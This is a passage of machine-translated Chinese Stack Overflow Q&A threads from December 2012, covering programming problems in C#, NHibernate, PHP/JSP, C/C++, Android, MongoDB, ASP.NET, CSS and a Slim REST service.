            // an asterisk (*) to get all properties (columns).
            ManagementObjectSearcher searcher =
                new ManagementObjectSearcher("SELECT Product, SerialNumber FROM Win32_BaseBoard");

            // Executing the query...
            // Because the machine has a single Motherborad,
            // then a single object (row) returned.
            ManagementObjectCollection information = searcher.Get();
            foreach (ManagementObject obj in information)
            {
                // Retrieving the properties (columns)
                // Writing column name then its value
                foreach (PropertyData data in obj.Properties)
                    Console.WriteLine("{0} = {1}", data.Name, data.Value);
                Console.WriteLine();
            }

            // For typical use of disposable objects
            // enclose it in a using statement instead.
            searcher.Dispose();
            Console.Read();
        }
    }
} 
```

希望这会有所帮助

# c# - Fluent NHibernate 复杂的复合 Id

> ID：13841226
> 
> 赞同：0
> 
> 时间：2012-12-12T13:47:57.737
> 
> 标签：c#, fluent-nhibernate, asp.net-mvc-4

我一直在努力让以下工作几个小时。但我似乎无法找出我在这里做错了什么。

我正在使用 Fluent Nhibernate 自动映射器（和一些覆盖）来让这个结构工作。

```
public class Game:IKeyed<Guid>
{
    public virtual Guid Id { get; set; }
    //properties
}

public class Team : IKeyed<Guid>
{
    public virtual Guid Id { get; set; }
    //Other properties

    public virtual IList<GameTeam> GameTeams { get; set; }
}

public class GameTeam:IKeyed<GameTeamId>
{
    public virtual GameTeamId Id { get; set; }
    public virtual int CurrentRound { get; set; }
    public virtual IList<GameTeamRound> Rounds { get; set; }
}

public class GameTeamId
{
    public virtual Game Game { get; set; }
    public virtual Team Team { get; set; }

    //equals stuff
}

public class GameTeamRound : IKeyed<GameTeamRoundId>
{
    public virtual GameTeamRoundId Id { get; set; }
    //Properties

    public virtual IList<TeamRoundDecision> Decisions { get; set; }
}

public class GameTeamRoundId
{
    public virtual GameTeam GameTeam { get; set; }
    public virtual int RoundNumber { get; set; }
} 
```

GameTeam 关​​系是我可以管理的。但是 GameTeamRound 链接目前有点过分。:) 我什至有更深的层次。但我不想让问题变得更复杂。

我正在使用 NHibernate 为我生成我的数据库。所以我从我的模型开始。为了完成这项工作，我使用了一些映射覆盖来确保这些复合键正常工作。

```
public class GameTeamOverride : IAutoMappingOverride<GameTeam>
{
    public void Override(AutoMapping<GameTeam> mapping)
    {
        //mapping.IgnoreProperty(gt => gt.Id);
        mapping.CompositeId(gt => gt.Id)
               .KeyProperty(id => id.Game.Id, "GameId")
               .KeyProperty(id => id.Team.Id, "TeamId");
    }
}

public class GameTeamRoundOverride : IAutoMappingOverride<GameTeamRound>
{
    public void Override(AutoMapping<GameTeamRound> mapping)
    {
        //mapping.IgnoreProperty(gtr => gtr.Id);
        mapping.CompositeId(gtr => gtr.Id)
               .KeyProperty(id => id.GameTeam.Id.Game.Id, "GameId")
               .KeyProperty(id => id.GameTeam.Id.Team.Id, "TeamId")
               .KeyProperty(id => id.RoundNumber, "RoundId");
    }
} 
```

我已经尝试过各种各样的事情。如果你能指出我正确的方向，那就太好了。:)

谢谢蒂姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T13:58:46.703

为什么复合键的额外类？
它应该像这样工作：

实体：

```
public class Game:IKeyed<Guid>
{
    public virtual Guid Id { get; set; }
    //properties
}

public class Team : IKeyed<Guid>
{
    public virtual Guid Id { get; set; }
    //Other properties

    public virtual IList<GameTeam> GameTeams { get; set; }
}

public class GameTeam:IKeyed<GameTeamId>
{
    public virtual Game Game { get; set; }
    public virtual Team Team { get; set; }
    public virtual int CurrentRound { get; set; }
    public virtual IList<GameTeamRound> Rounds { get; set; }
}

public class GameTeamRound : IKeyed<GameTeamRoundId>
{
    public virtual GameTeam GameTeam { get; set; }
    public virtual int RoundNumber { get; set; }
    //Properties

    public virtual IList<TeamRoundDecision> Decisions { get; set; }
} 
```

映射：

```
public class GameTeamOverride : IAutoMappingOverride<GameTeam>
{
    public void Override(AutoMapping<GameTeam> mapping)
    {
        mapping.CompositeId()
               .KeyReference(id => id.Game, "GameId")
               .KeyReference(id => id.Team, "TeamId");
    }
}

public class GameTeamRoundOverride : IAutoMappingOverride<GameTeamRound>
{
    public void Override(AutoMapping<GameTeamRound> mapping)
    {
        mapping.CompositeId()
               .KeyReference(id => id.GameTeam.Game, "GameId")
               .KeyReference(id => id.GameTeam.Team, "TeamId")
               .KeyProperty(id => id.RoundNumber, "RoundId");
    }
} 
```

请注意：我不确定是否可以在复合 ID 中使用这种嵌套。如果没有，您将需要为 Game 和 Team 添加属性，并将调用分别委托给`GameTeam.Game`它们`GameTeam.Team`。

此外，请重新考虑您的设计。对于新编写的应用程序，不鼓励使用复合键。如果可以避免它们，请避免它们。

# cloud-foundry - 无法在 cloudfoundry.com 中启动应用程序

> ID：13841230
> 
> 赞同：0
> 
> 时间：2012-12-12T13:48:06.723
> 
> 标签：cloud-foundry

vmc 启动应用程序失败：

```
C:\Users\Vincent.Chan>vmc start TaoMoney
Starting TaoMoney... SKIPPED
Already started.
Checking TaoMoney... FAILED 
```

但 vmc 应用程序和 vmc 删除应用程序有效。vmc 应用程序得到结果：

```
C:\Users\Vincent.Chan>vmc apps
Getting applications... OK

name       status   usage      runtime   url
TaoMoney   0%       1 x 512M   java      taomoney.cloudfoundry.com 
```

# php - PHP到JSP短代码转换/翻译

> ID：13841232
> 
> 赞同：-1
> 
> 时间：2012-12-12T13:48:07.807
> 
> 标签：php, json, jsp

我有一个小问题，我知道如何在 PHP 中做我所做的，但不知道如何在 JSP 中实现，有人可以帮忙吗？

基本上这是我在php中的代码：

```
<script type="text/javascript">
....
....

<?php

$order_items = getCurrentAttribute('confirmation','orderitems');
$order_items = explode('||',$order_items);
$fo_order_items = array();
foreach($order_items as $item)
{
    $item = explode('|',$item);
    if(!$item[0]) continue;

    $fo_order_items[$item[0]] = array(
        $item[3],(int) $item[4],$item[1]
    );
}

?>

var fo_order_items = <?php echo json_encode($fo_order_items); ?>
....
....
....
</script> 
```

在这里您可以找到 order_items 变量在开头的样子的示例：

```
sku1|title1|size1|price1|quantity1||sku2|title2|size2|price2|quantity1 
```

提前致谢。

PS 不要担心 getCurrentAttribute() 函数，它已经在 J​​SP 中完成了

干杯，/马辛

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:15:10.670

```
String items[] = order_items.split("||") ;

List<String> list = Arrays.asList(items); 
HashMap map = new HashMap();
for( String i : list )
{ 
    String it[] = i.split("|");
    if(!it[0].equals(null)) continue;
     map.put(it[0] , new Object(){ it[3] , it[4] , it[1]});

} 
```

// 我想这可能会有所帮助 // 对于 json 编码，请查看 JSON - LIB 或 GS​​ON lib

# blogengine.net - 该类型在两个 asp.net 中都存在

> ID：13841237
> 
> 赞同：0
> 
> 时间：2012-12-12T13:48:24.143
> 
> 标签：blogengine.net

我只是将 blogengine.net 集成到我的扩展网络应用程序（不是网站）中

为此，我已将所有博客引擎页面转换为 Web 应用程序页面。根据应用程序文件夹设置命名空间引用

我已经成功构建了解决方案。但是当我运行主应用程序时出现以下错误。

```
Compilation Error

Description: An error occurred during the compilation of a resource required to service this request. Please review the following specific error details and modify your source code appropriately.

Compiler Error Message: CS0433: The type 'MyStore.App_Code.Controls.PostPager' exists in both 'c:\WINDOWS\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\root\6332283b\32bb0d6a\App_Code.afjt0bia.dll' and 'c:\WINDOWS\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\root\6332283b\32bb0d6a\assembly\dl3\faca6d87\a3e83425_6ad8cd01\MyStore.DLL' 
```

我检查了所有命名空间引用，但没有发现任何重复的引用。

请帮助我摆脱困境。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-05T05:29:13.560

将您的代码文件移出`App_Code`文件夹并将它们放入`Classes`文件夹中。

# c++ - 是否有可以忽略函数的 gcc 编译指示？

> ID：13841238
> 
> 赞同：1
> 
> 时间：2012-12-12T13:48:31.547
> 
> 标签：c++, c, gcc

我想要一个完全忽略函数的命令。有人曾经向我展示过命令，但我在手册中找不到。

```
void a()
{
return;
}
#pragma gcc_disable
void a ()
{
return q09w8uifsdf
}
#include <stdio.h>
int main ()
{
  a();
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T13:51:49.097

嗯……你是说这个？

```
void a()
{
return;
}
#if 0
void a ()
{
return q09w8uifsdf
}
#endif
#include <stdio.h>
int main ()
{
  a();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:44:21.320

对于一个衬垫，只需将其注释掉

```
#define MAYBE /##/

MAYBE int a (){ return 0;} 
```

保留它

```
#define MAYBE

MAYBE int a (){ return 0;} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-24T18:15:03.003

您没有任何`pragma`忽略执行函数的指令。您可以使用`conditional preprocessor`指令忽略它们。

`#if`并且`#ifdef`可以用来忽略一个函数..

`#ifdef`检查 a 是否`MACRO`已定义..`#if 0`并可用于直接忽略执行的函数..

# dom - JCrop：以前的图像没有更新？

> ID：13841240
> 
> 赞同：1
> 
> 时间：2012-12-12T13:48:40.900
> 
> 标签：dom, jquery-plugins, jcrop, jquery

我开发了一个小型 JCrop 文件上传应用程序；这是我的代码：

```
 function createCropImage(event)
   {     
   //alert(event.target.result); 

   document.getElementById("Imgpreview").src = event.target.result;
   var img2 = document.getElementById("Imgpreview1").src = event.target.result;

   // Create variables (in this scope) to hold the API and image size
   var jcrop_api, boundx, boundy;

   $('#Imgpreview1').Jcrop({
        onChange: updatePreview,
        onSelect: updatePreview,
        aspectRatio: 1
      },function(){
        // Use the API to get the real image size

   var bounds = this.getBounds();
       boundx = bounds[0];
       boundy = bounds[1];
       // Store the API in the jcrop_api variable
       jcrop_api = this;

    });

    function updatePreview(c)
      {
      $('#Xcoardinate').val( Math.round(c.x));
      $('#Ycoardinate').val( Math.round(c.y));

      $('#width').val( Math.round(c.w));
      $('#height').val( Math.round(c.h));
        if (parseInt(c.w) > 0)
          {
          var rx = 100 / c.w;
          var ry = 100 / c.h;

          $('#Imgpreview').css({
            width: Math.round(rx * boundx) + 'px',
            height: Math.round(ry * boundy) + 'px',
            marginLeft: '-' + Math.round(rx * c.x) + 'px',
            marginTop: '-' + Math.round(ry * c.y) + 'px'
          });
        }
      };

} 
```

这`Imgpreview`是预览图像，`Imgpreview1`也是源图像。我首先通过浏览按钮选择一个图像：

```
<input type="file" size="45" id="photoUploadElmt" name="upload" onchange="previewImg()" style="width:430px;"/> 
```

原始图像 (Imgpreview1) 和预览图像 (Imgpreview) 显示正常，但如果我选择另一个图像，预览图像是正确的，但`Imgpreview1`我看到的是旧图像。

如果我将以下代码放在注释中，则图像会正确显示，但我会丢失 JCrop 实例：

```
 $('#Imgpreview1').Jcrop({
            onChange: updatePreview,
            onSelect: updatePreview,
            aspectRatio: 1
          },function(){
            // Use the API to get the real image size

            var bounds = this.getBounds();
            boundx = bounds[0];
            boundy = bounds[1];
            // Store the API in the jcrop_api variable
            jcrop_api = this;

          }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-22T23:19:42.443

[destroy 方法](https://stackoverflow.com/questions/4466333/how-do-i-remove-jcrop)是不可靠的，所以创建一个自定义的，就像在这个[类似的问题中一样](https://stackoverflow.com/questions/12257390/jcrop-how-to-clear-all-the-div-width-height-markup/12417833#12417833)

# windows-8 - ASP.net 4.0 和 IE10 的 WebForms imagebutton 错误

> ID：13841246
> 
> 赞同：0
> 
> 时间：2012-12-12T13:49:05.963
> 
> 标签：windows-8, webforms, asp.net-4.0, internet-explorer-10

我们让 Windows 8 Internet Explorer 10 上的用户在旧版 WebForms 应用程序上收到“输入字符串格式不正确”异常。我们做了一些研究，发现在 ASP.NET 4 中存在一个错误，IE 10 和 imagebutton 控件在单击时无法正常工作。

不需要任何代码更改的一种解决方案是使用 .net 框架 4.5 更新网络服务器，这将纠正错误。我们在测试服务器上这样做了，错误消失得很好！

我的问题是：**有谁知道安装 .net 框架 4.5 的解决方案可能带来的任何风险？Windows 8 IE 10 和 ASP.Net WebForms 或 MVC 是否存在我们应该注意的其他问题列表？**

可以在此处找到该问题的详细信息：

[https://connect.microsoft.com/VisualStudio/feedback/details/755419/asp-net-4-0-and-ie10-click-on-imagebutton-in-updatepanel-produces-error-click-on-normal-按钮不](https://connect.microsoft.com/VisualStudio/feedback/details/755419/asp-net-4-0-and-ie10-click-on-imagebutton-in-updatepanel-produces-error-click-on-normal-button-does-not)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-03T13:00:15.993

在服务器上安装 .net framework 4.5 解决了这个问题，我们没有看到任何其他问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T13:17:00.057

[Scott Hanselman](http://www.hanselman.com/blog/BugAndFixASPNETFailsToDetectIE10CausingDoPostBackIsUndefinedJavaScriptErrorOrMaintainFF5ScrollbarPosition.aspx)在一年前描述了这个问题。问题是浏览器定义文件中的一个错误，其中 ASP.NET 将 IE10 归类为未知浏览器。

以下修补程序（.NET 2 和 4）应该可以解决所描述的问题：

*   [http://support.microsoft.com/kb/2600088](http://support.microsoft.com/kb/2600088)
*   [http://support.microsoft.com/kb/2600100](http://support.microsoft.com/kb/2600100)

# c - 解释 force_align_arg_pointer 函数属性

> ID：13841247
> 
> 赞同：3
> 
> 时间：2012-12-12T13:49:22.610
> 
> 标签：c, linux, gcc, x86, function-attributes

来自[GCC 文档](http://gcc.gnu.org/onlinedocs/gcc-4.3.2/gcc/Function-Attributes.html#Function-Attributes)

> 在 Intel x86 上，该`force_align_arg_pointer`属性可以应用于单个函数定义，生成一个替代`prologue`并`epilogue`重新对齐`runtime stack`. 这支持将使用 4 字节对齐堆栈运行的旧代码与保留 16 字节堆栈的现代代码混合使用`SSE compatibility`。交替序幕和尾声比常规序幕更慢且更大，并且交替序幕需要`scratch register`; 如果与`regparm attribute`. 该`force_align_arg_pointer`属性与嵌套函数不兼容；这被认为是一个硬错误。

具体来说，我想知道什么是序言、尾声和 SSE 兼容性？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T13:49:22.440

来自[gcc 手册](http://gcc.gnu.org/onlinedocs/gccint/Function-Entry.html#Function-Entry)：

```
void TARGET_ASM_FUNCTION_PROLOGUE (FILE *file, HOST_WIDE_INT size) 
```

序言负责设置堆栈帧，初始化帧指针寄存器，保存必须保存的寄存器，并`size`为局部变量分配额外的存储字节。`file`是一个标准输入输出流，汇编代码应该输出到该流。

在具有“寄存器窗口”的机器上，函数入口代码不会将窗口中的寄存器保存在堆栈中，即使它们应该由函数调用保留；相反，如果函数中使用了任何非调用使用的寄存器，它会采取适当的步骤来“推送”寄存器堆栈。

在函数可能有也可能没有帧指针的机器上，函数入口代码必须相应变化；如果需要，它必须设置帧指针，否则不设置。要确定是否需要帧指针，宏可以引用变量`frame_pointer_needed`。变量的值将`1`在需要帧指针的函数中运行时。

```
void TARGET_ASM_FUNCTION_EPILOGUE (FILE *file, HOST_WIDE_INT size) 
```

如果已定义，则为输出汇编代码以退出函数的函数。结语负责在调用函数时将保存的寄存器和堆栈指针恢复为其值，并将控制权返回给调用者。该宏采用与宏相同的参数，并且`TARGET_ASM_FUNCTION_PROLOGUE`要恢复的寄存器由相同的方式确定。`regs_ever_live``CALL_USED_REGISTERS`

`SSE (Streaming SIMD Extensions)`是 128 位 CPU 寄存器的集合。这些寄存器可以用 4 个 32 位标量打包，之后可以同时对 4 个元素中的每一个执行操作。相比之下，在常规装配中可能需要 4 次或更多操作才能完成相同的操作。

# c++ - C++：访问虚拟方法

> ID：13841248
> 
> 赞同：3
> 
> 时间：2012-12-12T13:49:23.747
> 
> 标签：c++, pointers, methods, virtual, vtable

我正在尝试使用虚拟方法表通过类中的索引调用函数......假设我们有以下代码：

```
class Base
{
public:
    Base() {}
    virtual ~Base() {}

    virtual Base* call_func(unsigned int func_number)
    {
       // Some way to call f_n
    }
protected:
    virtual Base* f_1() const = 0;
    virtual Base* f_2() const = 0;
    virtual Base* f_3() const = 0;
}; 
```

我已经使用函数数组、if-statement 和 case-statement 实现了这一点……那么，有没有更好的方法来仅使用指针（例如访问 vtable）或类似的东西来调用方法？

对不起我糟糕的英语：S ...并提前感谢！

编辑：感谢所有建议！我将扩展我的问题：

解决此问题后，我将使用 f_1、f_2、f_3 的不同实现创建派生类（例如派生类 1 和派生类 2），并具有如下所示的类控件：

```
class Control
{
protected:
    Base* current;

public:
    Control(Base* curr = new derived1): current(curr) {}
    virtual ~Control() 
    {
        delete current;
    }
    virtual void do_something(unsigned int func_numb)
    {
        delete current
        Base* new = current->next_state(stl);
        current = new;
    }
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T13:54:25.057

要么是 switch 语句：

```
switch (func_number)
{
    case 1:
        f_1();
        break;
    case 2:
        f_2();
        break;
    case 3:
        f_3();
        break;
} 
```

或者使用函数指针数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:56:31.157

我假设您只想找到所有可能的方法来解决它。

您可以使用指向成员函数的指针映射（或向量）并将它们初始化一次（在构造函数中或静态地）。这可以模拟 vtable。

这几行之间的东西：

```
class Base
{
public:
    Base() {
        functions.insert(std::make_pair(1,&Base::f_1));
        functions.insert(std::make_pair(2,&Base::f_2));
        functions.insert(std::make_pair(3,&Base::f_3));
        }
    virtual ~Base() {}
    virtual Base* call_func(unsigned int func_number)
    {
    return (this->*functions[func_number])();
}
protected:
    std::map<unsigned int, Base*(Base:: *)()const> functions;
virtual Base* f_1() const = 0;
virtual Base* f_2() const = 0;
virtual Base* f_3() const = 0; 
```

};

这甚至对于继承的类也应该有效（`call_func`不过我会做非虚拟的）。是的，您应该检查该项目是否真的在地图（或矢量）中，如果它不是`nullptr`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:13:15.740

没有可移植的方式来访问虚函数表；语言规范没有指定应该如何实现虚拟分派，因此甚至不需要表存在，更不用说程序可以访问了。

没有比您提到的方法更好的方法来做您想做的事情：函数指针表或`if`/`switch`条件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T15:08:34.720

**注意 1：使用方法映射或 switch-case 方法访问您的方法比使用 vtable 指针更安全。**

**注意 2：小程序集部分适用于 VC++，不确定是否适用于其他编译器。**

虽然存在一种访问虚拟表函数的方法：

```
// create our object
X *obj = new X();

// access the vtable pointer
int* vptr = *(int**)obj;

// set the this pointer
__asm
{
  mov ecx, obj
}

// call the first method from the vtable
( (void (*)()) vptr[0] )(); 
```

请参阅此处的深入解释：http: [//kaisar-haque.blogspot.nl/2008/07/c-accessing-virtual-table.html](http://kaisar-haque.blogspot.nl/2008/07/c-accessing-virtual-table.html)

# android - 如何在android应用程序中动态添加触摸描述的位置的按钮？

> ID：13841252
> 
> 赞同：0
> 
> 时间：2012-12-12T13:49:35.267
> 
> 标签：android, android-layout, android-widget

如何在android应用程序中动态添加触摸描述的位置的按钮？

想象一下，我有一个空白活动，并且使用 on touch 侦听器进行触摸时，我可以获得 x,y 坐标。当我触摸时，我想在我动态触摸的位置（x，y）插入按钮。我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:00:44.107

我在这里发布了一个带有 textbox 的演示。您可以根据您的要求进行更改。

activity_main.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical" android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <FrameLayout 
        android:id="@+id/frameLayout1" 
        android:layout_height="fill_parent" android:layout_width="fill_parent">

        <LinearLayout android:layout_height="wrap_content"
            android:layout_width="wrap_content"
            android:orientation="horizontal"
            android:id="@+id/layout_map"
             >

            <TextView android:layout_height="wrap_content"
                android:layout_width="wrap_content"

                android:text="One"
                 />
            <TextView android:layout_height="wrap_content"
                android:layout_width="wrap_content"

                android:text="One"
                 />
        </LinearLayout>
    </FrameLayout>

</LinearLayout> 
```

MainActivity.java

```
import android.os.Bundle;
import android.app.Activity;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.widget.FrameLayout;
import android.widget.LinearLayout;

public class MainActivity extends Activity {
    FrameLayout frmLayout;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        frmLayout = (FrameLayout) findViewById(R.id.frameLayout1);
        frmLayout.setFocusable(true);
        LinearLayout et = new LinearLayout(this);

        frmLayout.addView(et, 100, 100);
        frmLayout.setOnTouchListener(new OnTouchListener() {

            public boolean onTouch(View v, MotionEvent event) {
                Log.i("TESTING",
                        "touch x,y == " + event.getX() + "," + event.getY());
                frmLayout.setPadding(Math.round(event.getX() - 20),
                        Math.round(event.getY()), 0, 0);
                return true;
            }
        });

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:57:06.067

我不完全知道您是否可以在特定位置创建按钮。虽然您可以使用 AbsoluteLayout 完成此操作，但现在已弃用。

我宁愿最初在布局中定义一个按钮并使其不可见，然后在触摸事件上，使用[翻译动画](http://developer.android.com/reference/android/view/animation/TranslateAnimation.html)将其移动到特定位置。也不要忘记使按钮可见。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:00:53.387

您可以通过 onTouchEvent 获取 x 和 y 坐标。

你应该重写 onTouchEvent(MotionEvent event) 然后调用 event.getX() 和 event.getY() 来获取用户触摸的坐标位置（它们将是浮动的）。

然后，您应该使用 AbsoluteLayout 并在子项中指定 android:layout_x 和 android:layout_y。（AbsoluteLayouts 不常用）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-13T15:24:18.553

我的布局上有很多小部件。所以我最初让它们全部不可见，并在触摸时为触摸分配了新的 x,y 坐标，并通过使用[“Object Animator”](http://developer.android.com/reference/android/animation/ObjectAnimator.html)将小部件（例如按钮）移动到触摸的 x,y 坐标。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-12-12T13:53:36.800

您需要一个相对布局，该布局在您的活动的某些层具有 fill_parent 宽度和高度。然后当有人点击屏幕时，您需要在触摸监听器上获得要点，并在您的相对布局上的确切 x 和 y 处创建一个新的图像视图，但请确保您的相对布局嵌套到您的整个活动屏幕并具有准确的 x 和 y与设备屏幕。

通过 ontouchlistener 获取 x 和 y

```
img.setOnTouchListener(new OnTouchListener() {

            @Override
            public boolean onTouch(View v, MotionEvent event) {
                event.getX()     //cordinates wrt view
                event.getRawX()  //abs cordinates on screen
                                event.getY()     //cordinates wrt view
                event.getRawY()  //abs cordinates on screen
                return false;
            }
        }); 
```

# mongodb - 在 MongoDB 中从服务器端编写 js

> ID：13841253
> 
> 赞同：0
> 
> 时间：2012-12-12T13:49:40.273
> 
> 标签：mongodb, stored-procedures

我可以从服务器端编写一个过程，稍后将其存储在 Db 中并用于进一步的事务。

如果是的话，你能给我一个示例代码，展示如何在java中从服务器端编写js。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:14:06.390

> 我可以从服务器端编写一个过程，稍后将其存储在 Db 中并用于进一步的事务。

不，但正如@Philipp 所说，您可以编写一个 JavaScript 块，该块将在 MongoDB 的 JavaScript 引擎中进行评估（spidermonkey atm 除非您使用 V8 编译）。

我应该清楚这不是一个存储过程，它不像 SQL 过程那样运行“服务器端”。

您还必须注意 JS 引擎是单线程和 eval（使用时）锁，以及大约一吨的其他问题。

实际上，在系统集合中存储函数的全部能力就是为 MR 等任务存储重复代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:09:52.450

可以这样做，但 10gen 建议您不要这样做。Javascript 函数可以存储在特殊集合 system.js 中，并通过 eval 命令调用。

这篇文章的其余部分是从官方文档中复制和粘贴的：[http ://www.mongodb.org/display/DOCS/Server-side+Code+Execution#Server-sideCodeExecution-Storingfunctionsserverside](http://www.mongodb.org/display/DOCS/Server-side+Code+Execution#Server-sideCodeExecution-Storingfunctionsserverside)

* * *

注意：我们建议尽可能不要使用服务器端存储的函数。由于这些是代码，因此最好将它们与其余代码一起存储在版本控制系统中。

有一个名为 system.js 的特殊系统集合，可以存储要重用的 JavaScript 函数。要存储一个函数，你会这样做：

```
db.system.js.save( { _id : "foo" , value : function( x , y ){ return x + y; } } ); 
```

_id 是函数的名称，并且每个数据库都是唯一的。一旦你这样做了，你就可以从任何 JavaScript 上下文（db.eval、$where、map/reduce）中使用 foo 下面是一个来自 shell 的示例：

```
> db.system.js.save({ "_id" : "echo", "value" : function(x){return x;} })
> db.eval("echo('test')")
test 
```

有关完整示例，请参阅[http://github.com/mongodb/mongo/tree/master/jstests/storefunc.js](http://github.com/mongodb/mongo/tree/master/jstests/storefunc.js)。在 MongoDB 2.1 中，您还可以使用 db.loadServerScripts() 将 db.system.js 中保存的所有脚本加载到 shell 中

```
>db.loadServerScripts()
>echo(3)
3 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:04:45.660

那么你可以使用[morphia](http://code.google.com/p/morphia/)。它是 Java 中 mongo 的 ODM。我知道它不像您想要的那种 PL/SQL 解决方案。但是 mongo 没有像 Oracle 或 SQL Server 那样广泛支持约束或触发器。验证和其他东西需要通过代码来完成。ODM 之类的 Java 中的 Morphia、Node.js 中的 Mongoose 或 Python 中的 Mongoengine 都是相当不错的新兴库，您可以将它们用于此类任务，但这些限制在应用程序方面。

# c - fopen 不适用于字符串参数

> ID：13841255
> 
> 赞同：-3
> 
> 时间：2012-12-12T13:49:42.350
> 
> 标签：c, fopen

我有一个如下所示的字符矩阵

```
char files[4][10]; 
```

在矩阵中，这些 char 数组被保留。

```
文件1.txt
文件2.txt
文件 3.txt
文件4.txt
```

当我尝试对这个矩阵使用 fopen 时，我无法打开文件。我的代码是这样的：

```
 FILE *file;

    file = fopen(files[0],"rb");

    if(file == NULL){
       printf("cannot open");
    }
    else printf("opened"); 
```

这段代码给出了输出：无法打开。我在哪里做错了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T13:54:11.947

会想到两件事：

*   file1.txt 在您调用可执行文件的目录中不可用
*   您没有展示如何初始化文件数组。可能是您不是 0 终止字符串。

# asp.net - 在RequiredFieldValidator 中显示成功图标

> ID：13841261
> 
> 赞同：1
> 
> 时间：2012-12-12T13:50:04.003
> 
> 标签：asp.net, validation, requiredfieldvalidator

我正在放置一个图标，用于在验证`RequiredFieldValidator`失败时通知用户。我想知道如果验证成功代替验证错误图标是否可以显示图标？

我用谷歌搜索但没有找到任何直接的解决方案，但人们建议使用自定义 javascript 并使用`getElementByID`. 这个问题是否存在任何直接的、`ASP.net`基于 - 的解决方案？

# css - 位置：固定；在 css 中不适用于 IE6\IE7

> ID：13841264
> 
> 赞同：-4
> 
> 时间：2012-12-12T13:50:19.537
> 
> 标签：css

> **可能重复：**
> [位置：固定在 IE 6/7/8 和 mozilla 上工作](https://stackoverflow.com/questions/3711922/positionfixed-to-work-on-ie-6-7-8-and-mozilla)

位置：固定；在 css 中不适用于 IE6\IE7。解决方法是什么？请给我提意见

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T13:53:02.977

> IE 5/6 不支持定位：修复了 IE7 有一个奇怪的 bug；见页面。

取自 [http://www.quirksmode.org/css/contents.html](http://www.quirksmode.org/css/contents.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:52:25.547

看看这个解决方案：

[http://ryanfait.com/position-fixed-ie6/](http://ryanfait.com/position-fixed-ie6/)

# php - 从 Backbone 到 Slim REST 服务的 PUT 请求导致 404 Not Found

> ID：13841272
> 
> 赞同：2
> 
> 时间：2012-12-12T13:51:26.277
> 
> 标签：php, apache, backbone.js, http-status-code-404, slim

我有一个调用 Slim REST 服务的主干脚本。GET 请求工作正常，PUT 请求返回 404 Not Found。注意：这一直有效，直到我的代码最近被移动到不同的服务器（并且它在本地工作），所以我猜它与 Apache 配置设置有关。这是主干脚本的片段：

```
jQuery(document).ready(function ($) {

    //define box model
    var Box = Backbone.Model.extend({
        url: function () {
            var urlId = (this.id) ? this.id : "";
            var myUrl = "/wp-includes/api/service.php/box/" + urlId;
            return myUrl;   
        }
    });

        var BoxView = Backbone.View.extend({
        tagName: "div",
        template: $("#boxTemplate").html(),

        initialize: function () {
            this.model = new Box(box);
            this.render();
        },

        saveBox: function(e){
            e.preventDefault();
            $("#boxMessage").empty();
            var formData = {},
                prev = this.model.previousAttributes();

            $(e.target).closest("form").find(":input").not("button").each(function (){          
                var el = $(this);
                formData[el.attr("id")] = el.val();
            });

            this.model.set(formData);
            this.model.save(
                { },
                {
                    success: function() {
                        $("#boxMessage").html("Box information saved.");
                    },
                    error: function() {

                    }
                }
            );
        } 
```

下面是 Slim REST 服务的一个片段：

```
<?php

require 'Slim/Slim.php';

$app = new Slim();

$app->get('/workouts/:id',  'getWorkout');
$app->put('/box/:id', 'updateEventBox');

$app->run();

function getWorkout($id) {
    echo json_encode(GetEventCompetitorWorkout($id));
}

function updateEventBox($id) {
    $request = Slim::getInstance()->request();
    $body = $request->getBody();
    $eventBox = new EventBox(null);
    $eventBox->TakeJson($body);
    $eventBox->Save();
} 
```

这是请求的标头信息：

```
Request URL:http://www.mydomain.com/wp-includes/api/service.php/box/1
Request Method:PUT
Status Code:404 Not Found 
```

**更新：**刚刚测试了同一服务的 POST 并且效果很好。PUT 仍然失败。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T02:45:05.523

我发现某些服务器只启用了 GET、POST、HEAD 并且未启用 REST 所需的 PUT、DELETE 并不少见。情况可能是这样。

要对此进行测试，您可以通过在代码之前调用它来告诉 Backbone 使用“模拟 HTTP”：

```
Backbone.emulateHTTP = true; 
```

